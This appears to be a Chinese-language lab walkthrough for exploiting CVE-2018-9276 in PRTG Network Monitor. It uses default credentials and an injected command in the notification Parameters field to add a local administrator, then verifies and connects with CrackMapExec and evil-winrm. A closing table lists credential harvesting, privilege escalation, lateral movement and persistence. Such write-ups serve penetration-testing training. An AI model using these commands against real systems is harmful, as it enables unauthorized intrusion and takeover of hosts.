---
description: >-
  PRTG 網路監視器是無代理網路監視器軟體。它可用於監控頻寬使用情況、正常運作時間並收集來自各種主機（包括路由器、交換器、伺服器等）的統計資料。 PRTG
  的第一個版本於 2003 年發布。它採用自動發現模式來掃描網路區域並建立設備清單。一旦建立此列表，它就可以使用 ICMP、SNMP、WMI、NetFlow
  等協定從偵測到的設備收集更多資訊。設備也可以透過 REST API 與該工具通訊。該軟體
---

# PRTG Network Monitor

## <mark style="color:red;">**1. 發現點**</mark>

### 1️⃣ 發現點

* **Nmap 掃描** 發現：

```bash
sudo nmap -sV -p- --open -T4 10.129.201.50
```

* 發現服務：
  * Web UI 通常在 port `80`、`443` 或 `8080`
  * 顯示 PRTG 網路監控器（PRTG Network Monitor）
* 登入頁面嘗試：

```
http://10.129.201.50:8080
```

* 預設憑證：

```
prtgadmin : prtgadmin
```

* 透過 cURL 確認版本：

```bash
curl -s http://10.129.201.50:8080/index.htm | grep version
```

> 找到版本：**17.3.33.2830**\
> 符合 CVE-2018-9276，屬於 **已知驗證後命令注入漏洞**

## <mark style="color:red;">**2. 測試Payload**</mark>

> 此漏洞存在於「建立 Notification → Execute Program → Parameters」位置，會直接將參數傳入 PowerShell 腳本執行。

#### 操作步驟：

1. 登入 PRTG 控制台
2. 前往：

```
Setup → Account Settings → Notifications
```

3. 點擊 `Add new notification`
4. 設定：
   * 命名：`pwn`
   * 勾選「Execute Program」
   * 從 Program File 下拉選 `Demo exe notification - outfile.ps1`
   * 在「參數 (Parameters)」填入：

```
test.txt; net user prtgadm1 Pwn3d_by_PRTG! /add; net localgroup administrators prtgadm1 /add
```

5. 點 `Save`

## <mark style="color:red;">3. 利用已知漏洞</mark>

* 點選新增的通知旁邊的 `Test` 按鈕
* 會收到 `EXE notification is queued up` 提示
* 因為係盲注（無回顯），所以下一步需要驗證新增帳戶有冇成功

## <mark style="color:red;">4. 驗證本地管理員存取</mark>

#### 用 CrackMapExec 測試：

```bash
sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG!
```

如果出現：

```
[+] APP03\prtgadm1:Pwn3d_by_PRTG! (Pwn3d!)
```

代表用戶已經成功建立並有 admin 權限。

1️⃣ 打開 `/etc/hosts` 檔案：

```bash
sudo nano /etc/hosts
```

2️⃣ 加入目標 IP 與主機名稱映射，例如：

```
10.129.201.50   STMIP
```

3️⃣ 儲存 (`Ctrl+O`)

現在，學生們確信用戶已成功添加，他們需要連接到生成的目標機器，例如使用`Evil-WinRM` ：\


```shell
evil-winrm -i 10.129.201.50 -u prtgadm1 -p 'Pwn3d_by_PRTG!'
```

\


## <mark style="color:red;">5. 連鎖漏洞</mark>

### 5️⃣ 後續利用（連鎖漏洞）

| 階段               | 行動                                                             |
| ---------------- | -------------------------------------------------------------- |
| 已新增管理員帳號         | 使用 `RDP`、`WinRM`、或 `evil-winrm` 登入主機                           |
| 可透過 `evil-winrm` | `evil-winrm -i 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG!`    |
| 取得主機權限           | `whoami` 確認是否為 admin 或 SYSTEM                                  |
| 密碼蒐集             | 查看 `C:\ProgramData\Paessler\PRTG Network Monitor\` 內部檔案可能有明文憑證 |
| 提權               | 如果非 SYSTEM，可用 `token impersonation`、找 SUID、排程提權                |
| 橫向滲透             | 使用 `net view /domain`、`net group /domain` 尋找內部其他主機和 AD 資訊      |
| 持久化              | 建立任務計劃或註冊表開機自啟動後門                                              |
